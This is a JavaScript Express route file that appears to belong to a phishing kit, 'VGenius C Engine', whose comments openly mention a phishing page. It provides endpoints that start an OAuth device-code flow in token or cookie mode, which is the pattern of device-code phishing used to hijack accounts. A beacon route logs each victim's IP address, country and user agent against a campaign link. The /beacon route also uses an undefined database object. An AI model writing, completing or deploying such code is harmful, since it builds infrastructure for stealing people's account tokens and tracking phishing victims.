/**
 * VGenius C Engine – Device Proxy Routes
 * Handles /api/device/start, /api/device/status/:job_id, and /beacon
 */

const express = require('express');
const router = express.Router();
const deviceProxy = require('../services/deviceproxy');

/**
 * POST /api/device/start
 * Start a new device code flow
 * Body: { mode: "token" | "cookie" }
 * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
 */
router.post('/start', async (req, res) => {
  try {
    const mode = req.body.mode || req.headers['x-auth-mode'] || 'cookie';
    const jwtToken = req.body.jwt_token || req.headers['x-vg-jwt'] || req.query.token;

    if (!jwtToken) {
      return res.status(400).json({ error: 'JWT token required' });
    }

    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const result = await deviceProxy.startDeviceFlow(mode, jwtToken, apiBaseUrl);

    res.json(result);
  } catch (err) {
    console.error('[Device] Start error:', err.message);
    res.status(500).json({ error: 'Failed to start device flow', message: err.message });
  }
});

/**
 * GET /api/device/status/:job_id
 * Poll for device code flow status
 */
router.get('/status/:job_id', async (req, res) => {
  try {
    const { job_id } = req.params;
    const result = deviceProxy.getJobStatus(job_id);
    res.json(result);
  } catch (err) {
    console.error('[Device] Status error:', err.message);
    res.status(500).json({ error: 'Failed to get status' });
  }
});

// -------------------------------------------
// Beacon endpoint - tracks page visits
// -------------------------------------------
router.post('/beacon', async (req, res) => {
  try {
    const { jwt_token } = req.body;
    
    if (!jwt_token) {
      return res.status(400).json({ error: 'JWT token required' });
    }

    // Verify JWT and log the beacon
    const jwt = require('jsonwebtoken');
    const config = require('../config/env');
    
    try {
      const decoded = jwt.verify(jwt_token, config.JWT_SECRET);
      
      // Insert visitor record
      const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
      const userAgent = req.headers['user-agent'] || 'unknown';
      
      // Simple country detection (you can enhance this with GeoIP)
      let country = 'Unknown';
      try {
        // Try to get country from Cloudflare header or fallback
        const cfCountry = req.headers['cf-ipcountry'];
        if (cfCountry) country = cfCountry;
      } catch (e) {
        country = 'Unknown';
      }
      
      await db.query(
        'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())',
        [decoded.user_id, decoded.link_id, ipAddress, country, userAgent, 'waiting']
      );
      
      console.log(`[Beacon] Visitor logged - Link ID: ${decoded.link_id}, User ID: ${decoded.user_id}, IP: ${ipAddress}`);
      
      res.json({ success: true, message: 'Beacon received' });
    } catch (jwtErr) {
      return res.status(401).json({ error: 'Invalid JWT token' });
    }
  } catch (err) {
    console.error('[Beacon] Error:', err.message);
    res.status(500).json({ error: 'Beacon failed' });
  }
});

module.exports = router;
